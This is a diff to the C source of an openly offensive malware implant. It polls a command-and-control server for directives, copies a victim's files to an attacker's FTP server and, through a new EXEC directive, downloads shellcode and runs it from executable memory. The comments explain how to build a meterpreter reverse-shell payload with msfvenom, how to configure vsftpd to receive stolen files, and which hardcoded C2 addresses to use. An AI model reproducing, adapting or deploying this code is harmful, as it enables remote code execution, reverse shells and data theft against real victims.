@@ -13,9 +13,9 @@
 
 /* COMPILATION: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast!
  * sudo apt install libcurl4-openssl-dev
- * gcc -fno-stack-protector -z execstack main.c -o main -s -lcurl
+ * gcc main.c -o main -s -lcurl
 */
-/* COMPILATION FOR WINDOWS:		// Shellcode execution on Windows is a work in progress...
+/* COMPILATION FOR WINDOWS:		// Modules need to be tweaked if this is being deployed against windows. It compiles but has not been tested.
  * 
  * gcc .\linux-main.c -o .\linux-main -IC:\curl\include\curl C:\curl\lib\libcurl.dll.a --static
  *	- obtain curl from the following link: https://curl.se/windows/
@@ -26,20 +26,26 @@
  * */
 /* SUPPORTED DIRECTIVES:
  * - COPY
+ * - EXEC
 */
 
 /* OPERATING THE C2:
- * Leave the control directive in "instruction.txt" and serve at CADDRESS as shown below. You also need to serve valid FTP credentials as shown in the global variable declarations.
+ * Leave the control directive in "instruction.txt" and serve at CADDRESS as shown below.
  * 
- * The configuration of the VSFTPD server has a few sensitivities:
- * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port) along with the listening port
- * 	- The root directory of the user used to login to the FTP server should be set to the directory that shall contain the stolen files. That is why only the file is specified in the FTP link (local_root)
- * 	- The server must be configured to allow authenticated users to perform write operations (write_enable)
+ * COPY Directive:
+ * - You need to serve valid FTP credentials as shown in the global variable declarations.
+ * - The configuration of the VSFTPD server has a few sensitivities:
+ * 	> unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port) along with the listening port
+ * 	> The root directory of the user used to login to the FTP server should be set to the directory that shall contain the stolen files. That is why only the file is specified in the FTP link (local_root)
+ * 	> The server must be configured to allow authenticated users to perform write operations (write_enable)
+ * - The structure of the victim's file system is not maintained. All files are copied into the FTP user's root directory. Each copied file is prefixed with a short sequence of pseudo-random
+ *   characters so that duplicate file names do not cause issues.
+ * - Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to human-readable files (including PDFs, DOCs, etc).
  * 
- * The structure of the victim's file system is not maintained. All files are copied into the FTP user's root directory. Each copied file is prefixed with a short sequence of pseudo-random
- * characters so that duplicate file names do not cause issues.
- *
- * Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to human-readable files (including PDFs, DOCs, etc).
+ * EXEC Directive:
+ * - Produce a binary payload similar to the product of the following command: $ msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -b "\x00" >> shellcode
+ * - Serve the shellcode file and the instruction.txt file on the C2 webserver
+ * - Have a listener ready to catch the incoming shell
 */
 
 /* DESCRIPTION:
@@ -69,10 +75,10 @@ void ExecutePayload(void);
 
 // Globals:
 
-char * CADDRESS = "http://192.168.0.40:8080/instruction.txt";
+char * CADDRESS = "http://10.242.11.247:8080/instruction.txt";
 char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
 char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt";
-char * SHELLCODEADDRESS = "http://192.168.0.40:8080/shellcode";
+char * SHELLCODEADDRESS = "http://10.242.11.247:8080/shellcode";
 char * BASEDIRECTORY = "/";
 
 // Main function:
@@ -339,13 +345,9 @@ void ExecutePayload(void) {			// This function works by grabbing the shellcode, 
 
 	// at this point "buffer" contains the shellcode
 
-	for (int i = 0; i < strlen(buffer); i++) {				// sizeof buffer will print the entire contents of the buffer 
-		printf("\\x%x", buffer[i]);
-	}
+	void * functionPointer = mmap(0, sizeof buffer, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);	// Give me the memory for the shellcode
 
-	void * functionPointer = mmap(0, strlen(buffer), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);	// Give me the memory for the shellcode
-
-	memcpy(functionPointer, buffer, strlen(buffer));			// Here, here is the shellcode
+	memcpy(functionPointer, buffer, sizeof buffer);			// Here, here is the shellcode
 
 	((void (*)())functionPointer)();				// execute the shellcode by calling the code buffer() points to
 
